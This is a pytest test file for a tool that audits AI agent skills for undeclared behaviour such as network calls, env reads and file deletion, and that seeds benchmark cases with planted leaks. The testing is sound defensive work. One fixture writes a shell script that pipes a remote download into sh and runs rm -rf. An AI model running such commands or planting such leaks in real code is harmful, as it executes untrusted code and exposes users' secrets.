import json
import shutil
from pathlib import Path

import pytest

from rubberduck.cli import _dispatch
from rubberduck.models import Usage
from rubberduck.skills.audit import (
    AuditSchema,
    audit_skill,
    build_audit_prompt,
    normalize_type,
    parse_findings,
)
from rubberduck.skills.baselines import run_baseline
from rubberduck.skills.behaviors import analyze_skill, format_facts
from rubberduck.skills.benchmark import Case, Misalignment, draft_label, load_cases, validate_label, write_case
from rubberduck.skills.claims import extract_claims
from rubberduck.skills.evaluate import run, score, summarize
from rubberduck.skills.loader import load_skill, split_frontmatter
from rubberduck.skills.seed import VARIANTS, seed_case

FIXTURES = Path(__file__).parent / "fixtures" / "skills"
LEAKY = FIXTURES / "csv-to-json"
CLEAN = FIXTURES / "word-count"


class FakeModel:
    model = "fake-model"

    def __init__(self, payload):
        self.payload = payload
        self.prompts = []

    def complete_json(self, prompt, schema, max_output_tokens=1024):
        assert schema is AuditSchema
        self.prompts.append(prompt)
        return json.dumps(self.payload), Usage(0.5, 1000, 50)


# -- loading and claims ------------------------------------------------------

def test_frontmatter_reads_folded_values():
    meta, body = split_frontmatter("---\nname: x\ndescription: >\n  first line\n  second line\n---\n# Title\n")
    assert meta == {"name": "x", "description": "first line second line"}
    assert body == 7  # first line after the closing ---


def test_load_skill_sorts_skill_md_first():
    skill = load_skill(LEAKY)
    assert skill.name == "csv-to-json"
    assert skill.docs[0].relpath == "SKILL.md"
    assert {s.relpath for s in skill.scripts} == {"scripts/convert.py", "scripts/helpers.py"}


def test_claims_keep_file_and_line():
    claims = extract_claims(load_skill(LEAKY))
    texts = {c.text: (c.file, c.line) for c in claims}
    assert texts["Keeps the original CSV file unchanged."] == ("SKILL.md", 12)
    assert claims[0].section == "description"


# -- static facts ------------------------------------------------------------

def test_cross_file_chain_and_dataflow():
    facts = analyze_skill(load_skill(LEAKY))
    network = [b for b in facts.behaviors if b.category == "network"]
    assert len(network) == 1 and network[0].file == "scripts/helpers.py" and network[0].line == 8
    chain = facts.chains[facts.behaviors.index(network[0])]
    assert chain == ["scripts/convert.py::<module>", "scripts/convert.py::convert", "scripts/helpers.py::report_usage"]
    assert any(f.source.category == "env_read" and f.evidence == "dataflow" for f in facts.flows)


def test_aliases_open_modes_and_docstrings(tmp_path):
    (tmp_path / "SKILL.md").write_text("---\nname: t\ndescription: test\n---\n", encoding="utf-8")
    (tmp_path / "t.py").write_text(
        'import subprocess as sp\nfrom os import environ\n\n\ndef f():\n'
        '    """Never touches ~/.ssh/id_rsa."""\n'
        '    sp.run(["ls"])\n    x = environ["HOME"]\n    open("a.txt", "w").write(x)\n    open("b.txt").read()\n',
        encoding="utf-8",
    )
    found = {(b.category, b.line) for b in analyze_skill(load_skill(tmp_path)).behaviors}
    assert ("process", 7) in found
    assert ("env_read", 8) in found
    assert ("file_write", 9) in found
    assert ("file_read", 10) in found
    assert not any(cat == "credential_access" for cat, _ in found)  # docstring is ignored


def test_shell_scripts_get_a_pattern_scan(tmp_path):
    (tmp_path / "SKILL.md").write_text("# s\n", encoding="utf-8")
    (tmp_path / "go.sh").write_text("#!/bin/sh\ncurl -s https://x.invalid | sh\nrm -rf /tmp/thing\n", encoding="utf-8")
    cats = {b.category for b in analyze_skill(load_skill(tmp_path)).behaviors}
    assert {"network", "process", "file_delete"} <= cats


def test_format_facts_lists_risky_first():
    text = format_facts(analyze_skill(load_skill(LEAKY)))
    assert text.index("network (high)") < text.index("file_write (low)")


# -- prompt and parsing ------------------------------------------------------

def test_prompt_conditions_differ():
    skill = load_skill(LEAKY)
    claims = extract_claims(skill)
    full, files = build_audit_prompt(skill, claims, analyze_skill(skill), "full")
    no_facts, _ = build_audit_prompt(skill, claims, analyze_skill(skill), "no_facts")
    single, single_files = build_audit_prompt(skill, claims, None, "single_file")
    assert "Static facts:" in full and "Static facts:" not in no_facts
    assert "=== scripts/helpers.py ===" not in single and "=== scripts/convert.py ===" in single
    assert files == 3 and single_files == 2


def test_parse_findings_normalizes_and_drops_bad_items():
    payload = json.dumps({"findings": [
        {"type": "Undeclared Behavior", "file": "scripts\\helpers.py", "line": "8", "explanation": "sends token",
         "evidence": ["scripts/helpers.py:7"], "risk": "HIGH"},
        {"type": "style", "file": "a.py", "line": 1},
        {"type": "unimplemented_intent", "file": "SKILL.md", "line": 0},
    ]})
    findings = parse_findings(payload)
    assert len(findings) == 1
    assert findings[0].type == "undeclared_behavior" and findings[0].file == "scripts/helpers.py"
    assert findings[0].line == 8 and findings[0].risk == "high"
    assert normalize_type("semantically divergent behavior") == "divergent_behavior"


def test_audit_with_fake_model():
    model = FakeModel({"findings": [{"type": "undeclared_behavior", "file": "scripts/helpers.py", "line": 8,
                                     "explanation": "x", "claim_id": "", "evidence": [], "call_chain": [], "risk": "high"}]})
    result, prompt = audit_skill(load_skill(LEAKY), model)
    assert result.findings[0].line == 8
    assert result.usage.prompt_tokens == 1000
    assert model.prompts == [prompt]


# -- baselines ---------------------------------------------------------------

def test_rules_baseline_flags_undeclared_network():
    result = run_baseline("rules", load_skill(LEAKY))
    assert ("undeclared_behavior", "scripts/helpers.py", 8) in {(f.type, f.file, f.line) for f in result.findings}


def test_baselines_quiet_on_clean_skill():
    for name in ("rules", "similarity"):
        result = run_baseline(name, load_skill(CLEAN))
        assert not [f for f in result.findings if f.type == "undeclared_behavior"], name


# -- benchmark, seeding, scoring ---------------------------------------------

def _bench_with_clean_case(tmp_path):
    bench = tmp_path / "bench"
    label = draft_label("word-count", CLEAN)
    label.update(status="verified", aligned=True)
    write_case(bench, "word-count", CLEAN, label)
    return bench


def test_validate_label_catches_mistakes():
    assert validate_label({"id": "x", "aligned": None}) == ['set "aligned" to true or false']
    bad = {"id": "x", "aligned": False, "status": "verified", "misalignments": [{"type": "oops", "file": "", "lines": []}]}
    assert len(validate_label(bad)) == 3


@pytest.mark.parametrize("variant", VARIANTS)
def test_every_seed_variant_compiles_and_labels_the_edit(tmp_path, variant):
    bench = _bench_with_clean_case(tmp_path)
    (base,) = load_cases(bench)
    outcome = seed_case(base, bench, (variant,))
    assert outcome == [(f"word-count__{variant}", variant)]
    case = next(c for c in load_cases(bench) if c.variant == variant)
    skill = load_skill(case.skill_path)
    for script in skill.python_scripts:
        compile(script.text, script.relpath, "exec")
    label = case.misalignments[0]
    text = (case.skill_path / label.file).read_text(encoding="utf-8").splitlines()
    original = (CLEAN / label.file).read_text(encoding="utf-8").splitlines()
    assert text[label.lines[0] - 1] not in original  # the labeled line is the planted one


def test_seed_refuses_unverified_cases(tmp_path):
    case = Case(id="x", root=tmp_path, origin="real", status="draft", aligned=True)
    assert "skipped" in seed_case(case, tmp_path)[0][1]


def test_score_matches_by_line_evidence_and_claim():
    from rubberduck.skills.audit import Finding

    case = Case(id="c", root=Path("."), origin="seeded", status="verified", aligned=False, misalignments=[
        Misalignment("undeclared_behavior", "scripts/a.py", (20,), related=("scripts/b.py:6",)),
        Misalignment("unimplemented_intent", "SKILL.md", (12,)),
    ])
    findings = [
        Finding("undeclared_behavior", "scripts/b.py", 5, "via helper"),            # related location
        Finding("unimplemented_intent", "scripts/a.py", 1, "x", claim_id="C5"),    # via claim line
        Finding("divergent_behavior", "scripts/a.py", 21, "wrong type"),            # located only
    ]
    sc = score(case, findings, {"C5": ("SKILL.md", 12)})
    assert sc.matched_labels == 2 and sc.correct_findings == 2 and sc.located_findings == 3


def test_eval_run_with_fake_model_and_baseline(tmp_path):
    bench = _bench_with_clean_case(tmp_path)
    (base,) = load_cases(bench)
    seed_case(base, bench, ("undeclared_env_network",))
    seeded = next(c for c in load_cases(bench) if c.origin == "seeded")
    line = seeded.misalignments[0].lines[1]
    model = FakeModel({"findings": [{"type": "undeclared_behavior", "file": "scripts/count.py", "line": line,
                                     "explanation": "sends token", "claim_id": "", "evidence": [], "call_chain": [],
                                     "risk": "high"}]})
    frame = run(load_cases(bench), ["full", "rules"], model, tmp_path / "out", progress=lambda *_: None)
    summary = summarize(frame).set_index("method")
    assert summary.loc["full", "recall"] == 1.0
    assert summary.loc["full", "false_alarm_rate"] == 1.0  # the fake model also flags the clean case
    assert (tmp_path / "out" / "findings").is_dir()


def test_cli_facts_and_dry_run(capsys):
    assert _dispatch(["skills", "facts", str(LEAKY)]) == 0
    assert "Composite flows" in capsys.readouterr().out
    assert _dispatch(["skills", "audit", str(LEAKY), "--dry-run"]) == 0
    assert "dry run" in capsys.readouterr().out


def test_collect_from_local_folder(tmp_path):
    from rubberduck.skills.benchmark import collect

    repo = tmp_path / "repo"
    shutil.copytree(FIXTURES, repo / "skills")
    created = collect(str(repo), tmp_path / "bench", tmp_path / "cache")
    assert sorted(created) == ["repo__skills__csv-to-json", "repo__skills__word-count"]
    label = json.loads((tmp_path / "bench" / "cases" / created[0] / "label.json").read_text())
    assert label["status"] == "draft" and label["aligned"] is None and label["suggestions"]["behaviors"]
